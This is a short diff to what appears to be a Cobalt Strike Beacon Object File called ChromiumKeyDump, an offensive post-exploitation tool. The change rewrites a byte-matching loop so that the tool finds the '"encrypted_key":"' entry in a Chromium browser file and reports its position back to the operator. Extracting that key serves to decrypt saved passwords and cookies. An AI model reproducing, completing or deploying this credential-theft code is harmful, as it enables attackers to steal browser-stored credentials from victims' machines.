@@ -79,7 +79,7 @@ extern "C" void go(char* args, int alen) {
 
         for (int i = 0; i < sizeof(file_read); i++)
         {
-            if ((file_read[i-6] == 107) && (file_read[i - 5] == 101) && (file_read[i - 4] == 121) && (file_read[i - 3] == 34) && (file_read[i - 2] == 58) && (file_read[i - 1] == 34)) { // key":"
+            if ((file_read[i-16] == 34) && (file_read[i-15] == 101) && (file_read[i - 14] == 110) && (file_read[i - 13] == 99) && (file_read[i - 12] == 114) && (file_read[i - 11] == 121) && (file_read[i - 10] == 112) && (file_read[i - 9] == 116) && (file_read[i - 8] == 101) && (file_read[i - 7] == 100) && (file_read[i - 6] == 95) && (file_read[i - 5] == 107) && (file_read[i - 4] == 101) && (file_read[i - 3] == 121) && (file_read[i - 2] == 34) && (file_read[i - 1] == 58) && (file_read[i] == 34)) { // "encrypted_key":"
                 BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Found EncryptedKey at position: %i\n", prepos + i + 1);
                 
                 for (int j = i; j < sizeof(file_read); j++) {
